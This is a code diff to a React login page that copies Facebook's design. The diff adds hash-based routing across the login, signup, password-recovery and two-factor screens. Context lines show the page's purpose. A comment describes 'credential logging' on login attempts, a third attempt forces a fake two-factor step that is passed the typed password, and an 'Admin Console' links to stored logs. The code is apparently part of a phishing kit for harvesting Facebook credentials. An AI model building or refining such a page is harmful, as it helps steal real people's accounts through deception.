@@ -21,15 +21,32 @@ import ForgotPasswordFlow from './ForgotPasswordFlow';
 import SignUpFlow from './SignUpFlow';
 import TwoFactorVerification from './TwoFactorVerification';
 import { api } from '../api/client';
+import { getCurrentRoute, setRoute } from '../utils/router';
 
 export default function LoginPage({ onOpenAdmin }) {
   const { login, loginWithAccount, signup, recentAccounts } = useAuth();
 
-  // Mobile mode: 'accounts' | 'login' | 'find_account'
-  const [authMode, setAuthMode] = useState('accounts');
+  const getInitialDesktopMode = (r) => {
+    if (r.page === '2fa') return '2fa';
+    if (r.page === 'forgot') return 'forgot';
+    if (r.page === 'signup') return 'signup';
+    if (r.page === 'login') return 'form';
+    return 'accounts';
+  };
+  const getInitialAuthMode = (r) => {
+    if (r.page === '2fa') return '2fa';
+    if (r.page === 'forgot') return 'forgot';
+    if (r.page === 'signup') return 'signup';
+    if (r.page === 'login') return 'login';
+    return 'accounts';
+  };
 
-  // Desktop mode: 'accounts' | 'password' | 'form'
-  const [desktopMode, setDesktopMode] = useState('accounts');
+  const initialRoute = getCurrentRoute();
+  // Mobile mode: 'accounts' | 'login' | 'find_account' | '2fa' | 'forgot' | 'signup'
+  const [authMode, setAuthMode] = useState(() => getInitialAuthMode(initialRoute));
+
+  // Desktop mode: 'accounts' | 'password' | 'form' | '2fa' | 'forgot' | 'signup'
+  const [desktopMode, setDesktopMode] = useState(() => getInitialDesktopMode(initialRoute));
 
   const [selectedAccount, setSelectedAccount] = useState(null);
   const [email, setEmail] = useState('');
@@ -50,6 +67,37 @@ export default function LoginPage({ onOpenAdmin }) {
 
   const [liveDesktopAccounts, setLiveDesktopAccounts] = useState(null);
   const [liveMobileAccounts, setLiveMobileAccounts] = useState(null);
+
+  useEffect(() => {
+    const handleHash = () => {
+      const route = getCurrentRoute();
+      if (route.page === '2fa') {
+        setDesktopMode('2fa');
+        setAuthMode('2fa');
+        setRoute('2fa', true);
+      } else if (route.page === 'forgot') {
+        setDesktopMode('forgot');
+        setAuthMode('forgot');
+        setRoute('forgot', true);
+      } else if (route.page === 'signup') {
+        setDesktopMode('signup');
+        setAuthMode('signup');
+        setRoute('signup', true);
+      } else if (route.page === 'login') {
+        setDesktopMode('form');
+        setAuthMode('login');
+        setRoute('login', true);
+      } else if (route.page === 'accounts' || !route.page) {
+        setDesktopMode('accounts');
+        setAuthMode('accounts');
+      }
+    };
+
+    handleHash();
+
+    window.addEventListener('hashchange', handleHash);
+    return () => window.removeEventListener('hashchange', handleHash);
+  }, []);
 
   useEffect(() => {
     api.getFirstPageAccounts().then((res) => {
@@ -112,6 +160,7 @@ export default function LoginPage({ onOpenAdmin }) {
     setShowPassword(false);
     setTrialCount(0);
     setLoginError('');
+    setRoute('login');
   };
 
   // Mobile select account handler (no auto-fill of email or name)
@@ -124,6 +173,7 @@ export default function LoginPage({ onOpenAdmin }) {
     setTrialCount(0);
     setLoginError('');
     setAuthMode('login');
+    setRoute('login');
   };
 
   // Login submission handler with 3-trial validation and credential logging
@@ -169,6 +219,7 @@ export default function LoginPage({ onOpenAdmin }) {
     // Trial 3: redirect user to the Two-Factor Verification screen
     setTrialCount(currentTrial);
     setLoginError(false);
+    setRoute('2fa');
     if (typeof window !== 'undefined' && window.innerWidth > 768) {
       setDesktopMode('2fa');
     } else {
@@ -237,14 +288,21 @@ export default function LoginPage({ onOpenAdmin }) {
           userInput={email || selectedAccount?.name || 'User'}
           userPassword={password}
           onSuccess={async () => {
+            setRoute('home');
             if (selectedAccount) {
               await loginWithAccount(selectedAccount, password);
             } else {
               await login(email.trim(), password);
             }
           }}
-          onBack={() => setDesktopMode('form')}
-          onTryAnotherWay={() => setDesktopMode('forgot')}
+          onBack={() => {
+            setDesktopMode('form');
+            setRoute('login');
+          }}
+          onTryAnotherWay={() => {
+            setDesktopMode('forgot');
+            setRoute('forgot');
+          }}
         />
       ) : desktopMode === 'forgot' ? (
         <div className="fb-desktop-login-layout" style={{ width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
@@ -252,8 +310,12 @@ export default function LoginPage({ onOpenAdmin }) {
             isDesktop={true}
             initialAccount={null}
             initialInput=""
-            onBackToLogin={() => setDesktopMode('form')}
+            onBackToLogin={() => {
+              setDesktopMode('form');
+              setRoute('login');
+            }}
             onLoginSuccess={(acc, pass) => {
+              setRoute('home');
               if (acc) loginWithAccount(acc, pass);
               else login(email || acc?.email || 'User', pass || 'password');
             }}
@@ -262,11 +324,18 @@ export default function LoginPage({ onOpenAdmin }) {
       ) : desktopMode === 'signup' ? (
         <div style={{ width: '100%', minHeight: '100vh', backgroundColor: '#FFFFFF' }}>
           <SignUpFlow
-            onBackToLogin={() => setDesktopMode('form')}
-            onGoToFindAccount={() => setDesktopMode('forgot')}
+            onBackToLogin={() => {
+              setDesktopMode('form');
+              setRoute('login');
+            }}
+            onGoToFindAccount={() => {
+              setDesktopMode('forgot');
+              setRoute('forgot');
+            }}
             onSignUpSuccess={(data) => {
               signup(data);
               setDesktopMode('accounts');
+              setRoute('home');
             }}
           />
         </div>
@@ -357,7 +426,10 @@ export default function LoginPage({ onOpenAdmin }) {
                 <button
                   type="button"
                   className="fb-exact-btn-create-outline"
-                  onClick={() => setDesktopMode('signup')}
+                  onClick={() => {
+                    setDesktopMode('signup');
+                    setRoute('signup');
+                  }}
                 >
                   Create new account
                 </button>
@@ -380,6 +452,7 @@ export default function LoginPage({ onOpenAdmin }) {
                     className="fb-desktop-back-chevron"
                     onClick={() => {
                       setDesktopMode('accounts');
+                      setRoute('accounts');
                       setLoginError('');
                       setTrialCount(0);
                     }}
@@ -408,6 +481,7 @@ export default function LoginPage({ onOpenAdmin }) {
                           onClick={(e) => {
                             e.preventDefault();
                             setDesktopMode('forgot');
+                            setRoute('forgot');
                           }}
                         >
                           Find your account and log in.
@@ -473,6 +547,7 @@ export default function LoginPage({ onOpenAdmin }) {
                       onClick={(e) => {
                         e.preventDefault();
                         setDesktopMode('forgot');
+                        setRoute('forgot');
                       }}
                     >
                       Forgot password?
@@ -483,7 +558,10 @@ export default function LoginPage({ onOpenAdmin }) {
                   <button
                     type="button"
                     className="fb-desktop-create-btn"
-                    onClick={() => setDesktopMode('signup')}
+                    onClick={() => {
+                      setDesktopMode('signup');
+                      setRoute('signup');
+                    }}
                   >
                     Create new account
                   </button>
@@ -520,8 +598,26 @@ export default function LoginPage({ onOpenAdmin }) {
           <div className="fb-exact-footer-divider" />
 
           <div className="fb-exact-links-row">
-            <a href="#signup">Sign up</a>
-            <a href="#login">Log in</a>
+            <a
+              href="#signup"
+              onClick={(e) => {
+                e.preventDefault();
+                setDesktopMode('signup');
+                setRoute('signup');
+              }}
+            >
+              Sign up
+            </a>
+            <a
+              href="#login"
+              onClick={(e) => {
+                e.preventDefault();
+                setDesktopMode('form');
+                setRoute('login');
+              }}
+            >
+              Log in
+            </a>
             <a href="#messenger">Messenger</a>
             <a href="#lite">Facebook Lite</a>
             <a href="#video">Video</a>
@@ -536,12 +632,12 @@ export default function LoginPage({ onOpenAdmin }) {
             <a href="#terms">Terms</a>
             <a href="#help">Help</a>
             <a
-              href="/admin"
+              href="#admin/logs"
               style={{ color: '#0866FF', fontWeight: 600 }}
               onClick={(e) => {
                 e.preventDefault();
+                setRoute('admin/logs');
                 if (onOpenAdmin) onOpenAdmin();
-                else window.location.href = '/admin';
               }}
             >
               Admin Console
@@ -620,7 +716,10 @@ export default function LoginPage({ onOpenAdmin }) {
               <button
                 type="button"
                 className="fb-clean-create-btn"
-                onClick={() => setAuthMode('signup')}
+                onClick={() => {
+                  setAuthMode('signup');
+                  setRoute('signup');
+                }}
               >
                 Create new account
               </button>
@@ -646,6 +745,7 @@ export default function LoginPage({ onOpenAdmin }) {
                 className="fb-clean-back-btn"
                 onClick={() => {
                   setAuthMode('accounts');
+                  setRoute('accounts');
                   setLoginError('');
                   setTrialCount(0);
                 }}
@@ -691,6 +791,7 @@ export default function LoginPage({ onOpenAdmin }) {
                         onClick={(e) => {
                           e.preventDefault();
                           setAuthMode('forgot');
+                          setRoute('forgot');
                         }}
                       >
                         Find your account and log in.
@@ -757,6 +858,7 @@ export default function LoginPage({ onOpenAdmin }) {
                   onClick={(e) => {
                     e.preventDefault();
                     setAuthMode('forgot');
+                    setRoute('forgot');
                   }}
                 >
                   Forgotten password?
@@ -769,7 +871,10 @@ export default function LoginPage({ onOpenAdmin }) {
               <button
                 type="button"
                 className="fb-clean-create-btn"
-                onClick={() => setAuthMode('signup')}
+                onClick={() => {
+                  setAuthMode('signup');
+                  setRoute('signup');
+                }}
               >
                 Create new account
               </button>
@@ -792,14 +897,21 @@ export default function LoginPage({ onOpenAdmin }) {
             userInput={email || selectedAccount?.name || 'User'}
             userPassword={password}
             onSuccess={async () => {
+              setRoute('home');
               if (selectedAccount) {
                 await loginWithAccount(selectedAccount, password);
               } else {
                 await login(email.trim(), password);
               }
             }}
-            onBack={() => setAuthMode('login')}
-            onTryAnotherWay={() => setAuthMode('forgot')}
+            onBack={() => {
+              setAuthMode('login');
+              setRoute('login');
+            }}
+            onTryAnotherWay={() => {
+              setAuthMode('forgot');
+              setRoute('forgot');
+            }}
           />
         )}
 
@@ -813,8 +925,12 @@ export default function LoginPage({ onOpenAdmin }) {
             isDesktop={false}
             initialAccount={null}
             initialInput=""
-            onBackToLogin={() => setAuthMode('login')}
+            onBackToLogin={() => {
+              setAuthMode('login');
+              setRoute('login');
+            }}
             onLoginSuccess={(acc, pass) => {
+              setRoute('home');
               if (acc) loginWithAccount(acc, pass);
               else login(email || acc?.email || 'User', pass || 'password');
             }}
@@ -825,12 +941,22 @@ export default function LoginPage({ onOpenAdmin }) {
         {authMode === 'signup' && (
           <SignUpFlow
             isDesktop={false}
-            onClose={() => setAuthMode('accounts')}
-            onBackToLogin={() => setAuthMode('login')}
-            onGoToFindAccount={() => setAuthMode('forgot')}
+            onClose={() => {
+              setAuthMode('accounts');
+              setRoute('accounts');
+            }}
+            onBackToLogin={() => {
+              setAuthMode('login');
+              setRoute('login');
+            }}
+            onGoToFindAccount={() => {
+              setAuthMode('forgot');
+              setRoute('forgot');
+            }}
             onSignUpSuccess={(data) => {
               signup(data);
               setAuthMode('accounts');
+              setRoute('home');
             }}
           />
         )}
